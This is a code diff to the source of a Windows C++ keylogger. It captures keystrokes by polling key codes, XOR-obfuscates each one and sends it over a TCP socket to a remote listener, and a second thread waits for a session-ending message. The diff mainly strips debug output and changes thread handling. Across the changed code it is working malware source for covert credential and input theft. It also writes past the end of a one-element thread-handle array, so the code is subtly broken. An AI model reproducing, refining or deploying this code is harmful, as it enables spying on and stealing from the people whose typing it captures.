@@ -18,6 +18,12 @@ VOID Keylogger::setup()
 }
 
 
+VOID Keylogger::setSocket(SOCKET &sock)
+{
+    a_sock = sock;
+}
+
+
 wstring Keylogger::specialKey(INT &keystroke)
 {
     switch(keystroke)
@@ -30,8 +36,8 @@ wstring Keylogger::specialKey(INT &keystroke)
         return L"[SHIFT]";
                                                     
     case VK_RETURN:
-        return L"[ENTER]";
-        
+        //return L"[ENTER]";
+        return L"\n";
     case VK_BACK:
         return L"[BACKSPACE]";
         
@@ -169,32 +175,30 @@ wstring Keylogger::intToUnicode(INT keystroke)
 
 VOID Keylogger::directTcp()
 {
-    HANDLE threads[2];
-    wcout << "In startThread " << endl;
-    wcout <<"Address startThread: " << &a_sock << endl;
-    wcout << "Value socket: " << a_sock << endl;
+    HANDLE threads[1];
 
-    wcout << "go to directTcp" << endl;
+    wcout << "In startThread " << endl;
+
     threads[0] = CreateThread(NULL,0 ,sendKeystrokeThread ,&a_sock ,0 ,NULL); //https://stackoverflow.com/questions/1372967/how-do-you-use-createthread-for-functions-which-are-class-members
     threads[1] = CreateThread(NULL,0 ,recvDataThread ,&a_sock ,0 ,NULL);
 
-    Sleep(2000);
-    wcout << "WaitForMultipleObjects" << endl;
-    WaitForMultipleObjects(2,threads, TRUE, INFINITE); //https://stackoverflow.com/questions/43298052/windows-c-tcp-socket-sendrecv-at-the-same-time
+    //WaitForMultipleObjects(1,threads, TRUE, INFINITE); //https://stackoverflow.com/questions/43298052/windows-c-tcp-socket-sendrecv-at-the-same-time
+    
+    WaitForSingleObject(threads[1], INFINITE);
+    
+    wcout << "TerminateThread" << TerminateThread(threads[0], 0) << endl; //Once the first thread is finished, finish the second. 
+
+    CloseHandle(threads[0]);
+    CloseHandle(threads[1]);
     wcout << "finish ? " << endl;
 }
 
-//--------------------------------------------------------------------------------------------------------
-VOID Keylogger::setSocket(SOCKET &sock)
-{
-    a_sock = sock;
-}
 
 Keylogger::~Keylogger()
 {;}
 
-//----------------------------------------------------------------------------------
 
+//----------------------------------------------------------------------------------
 DWORD WINAPI sendKeystrokeThread(LPVOID param)
 {   
     SOCKET sock = *(SOCKET *)param;
@@ -205,7 +209,7 @@ DWORD WINAPI sendKeystrokeThread(LPVOID param)
 
     while (true)
     {
-        Sleep(10);
+        Sleep(20);
 
         for(INT keystroke=8; keystroke <= 222; keystroke++) //Test toute les touche
         {
@@ -222,9 +226,7 @@ DWORD WINAPI sendKeystrokeThread(LPVOID param)
                     unicode_char = keylogger.specialKey(keystroke);
                 }
                 wcout << "send char: "<<unicode_char << endl;
-                wcout << "sock address: " << &sock << endl;
-                int stattt = send(sock, (char *)XOREncryption(unicode_char).c_str(),unicode_char.length() * sizeof(WCHAR), 0);
-                wcout << "realy ????: " << stattt << endl;
+                send(sock, (char *)XOREncryption(unicode_char).c_str(),unicode_char.length() * sizeof(WCHAR), 0);
             }
         }
     }
@@ -233,15 +235,14 @@ DWORD WINAPI sendKeystrokeThread(LPVOID param)
 }
 
 
-
 DWORD WINAPI recvDataThread(LPVOID param)//waits to receive an end-of-connection message  for directTcp
 {
     SOCKET sock = *(SOCKET *)param;
+
     WCHAR buff[512]={0};
+
     while(TRUE)
     {
-        wcout << "sock recvDataThread: " << sock << endl;
-        wcout << "recv recvDataThread: "<< &sock <<"\n\n\n" << endl;
         INT stat = recv(sock, (CHAR *)buff, sizeof(buff), 0);
         if(stat == SOCKET_ERROR)
         {
@@ -250,18 +251,13 @@ DWORD WINAPI recvDataThread(LPVOID param)//waits to receive an end-of-connection
         }
         else if (XOREncryption( (wstring) buff) == L"\r\n")
         {
-            wcout << "stop waitingEndSession" << endl;
             break;
         }
         wcout << buff << endl;
 
         ZeroMemory(&buff, sizeof(buff));
-        wcout << "reset buff" << endl;
-
     }
-    DWORD exitCode;
+
     wcout << "stop thread baby !" << endl;
-    //TerminateThread(thread_to_finish, exitCode);
-    //wcout << "exit code: " << exitCode << endl; 
     return 0;
 }
